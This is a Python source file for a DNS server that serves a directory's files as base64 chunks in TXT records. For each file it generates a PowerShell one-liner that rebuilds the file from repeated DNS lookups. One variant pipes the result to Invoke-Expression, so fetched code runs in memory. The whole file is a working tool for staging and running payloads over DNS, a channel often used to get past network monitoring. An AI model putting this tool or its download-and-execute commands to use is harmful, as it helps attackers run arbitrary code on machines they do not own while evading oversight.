# -*- coding: utf-8 -*-

from __future__ import print_function

import binascii,socket,struct,os,re,hashlib
from base64 import b64encode

from dnslib import DNSRecord,RCODE,QTYPE,RR,TXT
from dnslib.server import DNSServer,DNSHandler,BaseResolver,DNSLogger
import cachetools.func

MAX_TXT_SIZE = 185 # 255/4/*3
MAX_TRANSFER_SIZE = MAX_TXT_SIZE * 5

class ShareDNS(BaseResolver):
    def __init__(self, domain, files_path):
        self.domain = domain
        self.files_path = files_path

    def resolve(self,request,handler):
        if request.q.qname.matchSuffix(self.domain):
            reply = request.reply()
            if request.q.qtype == QTYPE.TXT:
                qname = request.q.qname.stripSuffix(self.domain)

                if qname.matchSuffix("ls"):
                    # Directory listing
                    content = self.ls()
                    reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=60, rdata=TXT(content)))
                elif qname.matchSuffix("f") or qname.matchSuffix("c"):
                    # Serve files or commands
                    command = False
                    if qname.matchSuffix("f"):
                        qname = qname.stripSuffix("f")
                    else:
                        command = True
                        qname = qname.stripSuffix("c")

                    z = re.match("^(\d+)\.(.*)$", str(qname).strip("."))
                    if z:
                        # Serve file chunks
                        chunk_idx, fname = z.groups()
                        fname = fname.lower()
                        chunk_idx = int(chunk_idx)
                        content = self.ls()
                        if fname in content:
                            chunks = self.get_file_chunks(fname)
                            if chunk_idx < len(chunks):
                                chunk = chunks[chunk_idx]
                                reply.add_answer(RR(
                                    request.q.qname,
                                    QTYPE.TXT,
                                    ttl=60,
                                    rdata=TXT([ b64encode(chunk[i:i + MAX_TXT_SIZE]) for i in range(0, len(chunk), MAX_TXT_SIZE)])
                                    #rdata=TXT(b64encode(chunk))
                                ))
                        else:
                            reply.header.rcode = getattr(RCODE,'NXDOMAIN')
                    else:
                        # Serve file info (size, cmds)
                        content = self.ls()
                        fname = str(qname).strip(".").lower()
                        if fname in content:
                            n_chunks = len(self.get_file_chunks(fname))
                            if command:
                                cmd = self.gen_download_invoke_cmd(fname, n_chunks)
                            else:
                                cmd = self.gen_download_cmd(fname, n_chunks)
                            hash = self.get_file_hash(fname)
                            reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=60, rdata=TXT([hash,cmd,str(n_chunks)])))
                        else:
                            reply.header.rcode = getattr(RCODE,'NXDOMAIN')
        else:
            reply = request.reply()
            reply.header.rcode = getattr(RCODE,'NXDOMAIN')

        return reply

    @cachetools.func.ttl_cache(maxsize=1, ttl=60)
    def ls(self):
        return os.listdir(self.files_path)

    def get_file_chunks(self, fname):
        f = open(os.path.join(self.files_path, fname), "rb").read()
        return [f[i:i + MAX_TRANSFER_SIZE] for i in range(0, len(f), MAX_TRANSFER_SIZE)]

    def get_file_hash(self, fname):
        b = open(os.path.join(self.files_path, fname), "rb").read()
        return hashlib.sha256(b).hexdigest()

    def gen_download_cmd(self, fname, n_chunks):
        return '$o=[byte[]]::new(0);0..' + str(n_chunks-1) + '|%{$p=$_;0..99|%{try{$r=(Resolve-DnsName "$p.'+ fname + '.f.' + self.domain + '" -Type TXT -ErrorAction Stop).Strings;return}catch{sleep 1}};$r.ForEach({$o+=[Convert]::FromBase64String($_)})}'

    def gen_download_invoke_cmd(self, fname, n_chunks):
        return self.gen_download_cmd(fname, n_chunks) + ';[Text.Encoding]::Utf8.GetString($o)|IEX'

if __name__ == '__main__':
    import argparse,sys,time

    p = argparse.ArgumentParser(description="DNS share")
    p.add_argument("--port","-p",type=int,default=53,
                    metavar="<port>",
                    help="Local proxy port (default:53)")
    p.add_argument("--address","-a",default="",
                    metavar="<address>",
                    help="Local proxy listen address (default:all)")
    p.add_argument("--domain","-d",default="",
                    metavar="<domain>",
                    help="DNS server domain name (ex. momba.kz)",
                    required = True)
    p.add_argument("--tcp",action='store_true',default=False,
                    help="TCP proxy (default: UDP only)")
    p.add_argument("--log",default="request,reply,truncated,error",
                    help="Log hooks to enable (default: +request,+reply,+truncated,+error,-recv,-send,-data)")
    p.add_argument("--log-prefix",action='store_true',default=False,
                    help="Log prefix (timestamp/handler/resolver) (default: False)")
    p.add_argument("--files-path", "-f", required = True, help = "Files directory")
    args = p.parse_args()

    print("[I] Starting DNS share (%s) (%s:%d) [%s]" % (args.domain, args.address or "*", args.port, "UDP/TCP" if args.tcp else "UDP"))

    resolver = ShareDNS(args.domain, args.files_path)
    handler = DNSHandler
    logger = DNSLogger(args.log,prefix=args.log_prefix)
    udp_server = DNSServer(resolver,
                           port=args.port,
                           address=args.address,
                           handler=handler)
    udp_server.start_thread()

    if args.tcp:
        tcp_server = DNSServer(resolver,
                               port=args.port,
                               address=args.address,
                               tcp=True,
                               logger=logger,
                               handler=handler)
        tcp_server.start_thread()

    while udp_server.isAlive():
        time.sleep(1)
